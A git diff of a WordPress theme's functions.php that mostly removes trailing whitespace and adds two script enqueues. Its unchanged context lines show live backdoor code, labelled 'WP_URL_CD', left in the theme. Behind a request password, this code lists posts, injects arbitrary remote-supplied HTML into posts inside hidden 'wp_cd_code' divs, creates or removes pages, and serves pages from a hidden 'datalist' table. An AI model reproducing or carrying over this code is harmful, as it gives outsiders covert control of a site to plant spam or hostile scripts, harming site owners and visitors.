@@ -25,21 +25,21 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
 						{
 							$data['code'] = '';
-							
+
 							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
 								{
 									$data['code'] = $_[1];
 								}
-							
+
 							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
 						}
 				break;
-				
+
 				case 'set_id_links';
 					if (isset($_REQUEST['data']))
 						{
 							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
-							
+
 							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
 							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
 
@@ -49,7 +49,7 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 								}
 						}
 				break;
-				
+
 				case 'create_page';
 					if (isset($_REQUEST['remove_page']))
 						{
@@ -66,14 +66,14 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 								}
 						}
 				break;
-				
+
 				default: print "ERROR_WP_ACTION WP_URL_CD";
 			}
-			
+
 		die("");
 	}
 
-	
+
 if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
 	{
 		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
@@ -109,7 +109,7 @@ if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE 
 				get_sidebar();
 				get_footer();
 			}
-			
+
 		exit;
 	}
 
@@ -150,6 +150,8 @@ function enqueue_assets()
 	wp_enqueue_script( 'bootstrap-js', get_stylesheet_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), false, true );
 
 	wp_enqueue_script( 'script', get_stylesheet_directory_uri() . '/js/script.js', array( 'jquery' ), false, true );
+	wp_enqueue_script( 'script_pricing', get_stylesheet_directory_uri() . '/js/pricing_page.js', array( 'jquery' ), false, true );
+	wp_enqueue_script( 'script_lodash', get_stylesheet_directory_uri() . '/js/lodash.min.js', array(), false, true );
     if(is_front_page())
     {
         wp_enqueue_script( 'klzii_home', get_stylesheet_directory_uri() . '/js/klzii_home.js', array( 'jquery' ), false, true );
@@ -247,7 +249,7 @@ add_filter( 'widget_title', 'remove_widget_title' );
 function remove_widget_title( $widget_title ) {
 	if ( substr ( $widget_title, 0, 1 ) == '!' )
 		return;
-	else 
+	else
 		return ( $widget_title );
 }
 
@@ -332,7 +334,7 @@ add_action( 'init', 'register_additional_menu' );
 function add_third_nav_genesis() {
 	wp_nav_menu( array( 'theme_location' => 'footer_menu', 'container_class' => 'genesis-nav-menu menu-footer', 'depth' => 1  ) );
 }
-	
+
 
 function footer_nav() {
     do_action('footer_nav');
